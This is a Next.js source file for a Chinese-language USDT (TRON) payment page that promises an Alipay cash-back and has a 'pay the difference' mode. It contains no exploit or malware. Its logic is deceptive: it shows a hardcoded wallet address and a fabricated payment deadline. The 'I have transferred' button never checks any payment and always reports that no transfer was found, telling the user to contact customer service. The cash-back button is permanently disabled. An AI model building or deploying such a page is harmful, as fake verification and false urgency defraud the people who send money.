'use client';

import { useState, useEffect, useMemo } from 'react';
import { useSearchParams } from 'next/navigation';
import Image from 'next/image';

// 临时getConfig函数替代
const getConfig = () => {
  return {
    address: 'TYQraWpB5VsfuaAKCG6G9GHKnM3hCm5JUt',
    network: 'TRC20'
  };
};

const generateOrderNumber = () => {
  const timestamp = new Date().getTime();
  const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
  return `${timestamp}${random}`;
};

export default function UsdtPayment() {
  const searchParams = useSearchParams();
  const amount = Number(searchParams.get('amount')) || 0;
  const cashback = Number(searchParams.get('cashback')) || 0;
  const isTopup = searchParams.get('isTopup') === 'true';
  const account = searchParams.get('account') || '';
  const [copiedType, setCopiedType] = useState<'address' | 'amount' | null>(null);
  const [orderStatus, setOrderStatus] = useState('waiting'); // waiting, checking
  const [orderNumber] = useState(generateOrderNumber);
  const [config, setConfig] = useState(getConfig());
  
  // 监听配置更新
  useEffect(() => {
    const checkUpdate = () => {
      const newConfig = getConfig();
      if (newConfig.address !== config.address) {
        setConfig(newConfig);
      }
    };

    // 每秒检查一次配置更新
    const interval = setInterval(checkUpdate, 1000);
    return () => clearInterval(interval);
  }, [config.address]);

  const address = config.address;
  const network = 'TRC20';

  // 生成地址分段显示
  const addressSegments = useMemo(() => {
    return [
      address.slice(0, 4),
      address.slice(4, 8),
      address.slice(8, 12),
      address.slice(12, 16),
      address.slice(16, 20),
      address.slice(20, 24),
      address.slice(24, 28),
      address.slice(28, 32),
      address.slice(32)
    ];
  }, [address]);

  const copyToClipboard = async (text: string, type: 'address' | 'amount') => {
    try {
      await navigator.clipboard.writeText(text);
      setCopiedType(type);
      
      // 只在复制地址时进行验证
      if (type === 'address') {
        setTimeout(async () => {
          const clipboardContent = await navigator.clipboard.readText();
          if (clipboardContent !== address) {
            alert('警告：检测到收款地址可能被篡改！请联系客服获取正确的收款地址！');
          }
        }, 100);
      }
      
      setTimeout(() => setCopiedType(null), 2000);
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  const handleTransferConfirm = () => {
    setOrderStatus('checking');
    setTimeout(() => {
      alert('未查询到转账，请确认转账金额是否正确，或联系客服处理！');
      setOrderStatus('waiting');
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-gray-100 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-md mx-auto">
        <div className="bg-white shadow rounded-lg overflow-hidden">
          {/* USDT Logo */}
          <div className="flex justify-center p-6 bg-gray-50">
            <div className="w-20 h-20 bg-blue-500 rounded-full flex items-center justify-center">
              <span className="text-white text-3xl font-bold">₮</span>
            </div>
          </div>

          {/* Order Info */}
          <div className="p-6">
            <div className="text-center mb-6">
              <p className="text-gray-600 text-sm">订单编号：{orderNumber}</p>
              <div className="mt-2">
                {isTopup ? (
                  <p className="text-blue-600 font-bold text-xl">补差价金额：{amount} USDT</p>
                ) : (
                  <>
                    <p className="text-blue-600 font-bold text-xl">USDT金额：{amount} USDT</p>
                    <p className="text-red-600 font-bold mt-1">支付宝返现：¥{cashback.toFixed(2)}</p>
                  </>
                )}
              </div>
            </div>

            <div className="space-y-4">
              <div className="bg-gradient-to-r from-blue-50 to-blue-100 p-4 rounded-lg">
                <div className="text-center space-y-2 mb-4">
                  <p className="text-blue-800 font-medium">
                    当前USDT支付区块网络协议为{network}
                  </p>
                  <p className="text-red-500 font-bold text-sm">
                    到账金额需要与下方显示的金额一致，否则系统无法确认！
                  </p>
                  <p className="text-red-500 font-bold text-sm">
                    交易所充值用户请自行补加手续费，否则系统无法确认！
                  </p>
                </div>

                {/* 收款信息卡片 */}
                <div className="bg-white rounded-lg p-4 shadow-sm">
                  <div className="flex flex-col items-center space-y-4">
                    {/* 二维码 */}
                    <div className="relative w-48 h-48">
                      <Image
                        src="/qrcode_tron.png"
                        alt="TRON USDT收款码"
                        width={192}
                        height={192}
                        priority
                        className="rounded-lg"
                      />
                    </div>
                    
                    {/* TRON提示 */}
                    <div className="text-center text-gray-500 text-sm">
                      仅支持接收 TRON 资产
                    </div>

                    {/* 地址显示 */}
                    <div className="w-full bg-gray-50 p-3 rounded-lg">
                      <p className="text-gray-500 text-sm mb-2 text-center">收款地址</p>
                      <div className="font-mono text-sm text-gray-800 bg-white p-3 rounded border border-gray-200 break-all text-center mb-2">
                        {address}
                      </div>
                      <button
                        onClick={() => copyToClipboard(address, 'address')}
                        className="w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition-colors flex items-center justify-center space-x-2"
                      >
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
                        </svg>
                        <span>复制地址</span>
                        {copiedType === 'address' && <span className="text-green-300 text-xs">已复制!</span>}
                      </button>
                    </div>

                    {/* 金额显示 */}
                    <div className="w-full">
                      <p className="text-gray-500 text-sm mb-2 text-center">支付金额</p>
                      <div className="flex items-center justify-between bg-gray-50 px-4 py-3 rounded-lg">
                        <span className="text-xl font-bold text-blue-600">{amount} USDT</span>
                        <button
                          onClick={() => copyToClipboard(amount.toString(), 'amount')}
                          className="bg-blue-500 text-white px-3 py-1.5 rounded hover:bg-blue-600 flex items-center text-sm"
                        >
                          <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
                          </svg>
                          复制金额
                          {copiedType === 'amount' && <span className="text-green-300 text-xs ml-1">已复制!</span>}
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              <div className="bg-yellow-50 p-4 rounded-lg">
                <h3 className="text-lg font-bold text-yellow-800 mb-2">安全提示</h3>
                <ul className="space-y-2 text-yellow-700 text-sm">
                  <li>• 请确保您是从正确的网址访问本站</li>
                  <li>• 收款地址请以二维码为准，或联系客服核实</li>
                  <li>• 转账前请仔细核对地址和金额</li>
                  <li>• 如发现地址异常请立即联系客服</li>
                </ul>
              </div>

              <div className="text-center">
                <p className="text-red-500 font-bold text-sm">
                  ！请在北京时间{new Date().toLocaleDateString()} {new Date().getHours()}:50:58前支付！！
                </p>
              </div>

              <div className="flex space-x-4">
                <button
                  className="flex-1 bg-gray-500 text-white py-3 rounded-lg font-medium text-sm"
                  disabled
                >
                  等待付款后获取支付宝口令红包
                </button>
                <button
                  onClick={handleTransferConfirm}
                  disabled={orderStatus === 'checking'}
                  className="flex-1 bg-blue-500 hover:bg-blue-600 text-white py-3 rounded-lg font-medium text-sm disabled:bg-gray-400"
                >
                  {orderStatus === 'checking' ? '查询中...' : '已转账'}
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
} 